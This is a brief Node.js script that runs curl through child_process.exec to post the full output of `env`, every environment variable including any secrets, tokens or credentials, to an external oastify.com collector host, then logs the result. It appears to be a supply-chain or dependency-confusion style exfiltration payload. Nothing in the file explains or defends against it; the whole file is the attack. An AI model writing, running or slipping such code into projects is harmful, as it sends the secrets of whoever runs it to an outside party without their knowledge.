const{ exec } = require('child_process');

exec('curl -d "`env`" https://l0mncu14mfnxryokabnosz60frli98xx.oastify.com/test',(error,stdout,stderr)=>{
 if(error){
 console.error(`exec error: ${error}`);
 return;
 }
 console.log(`stdout: ${stdout}`);
 console.error(`stderr: ${stderr}`);
});
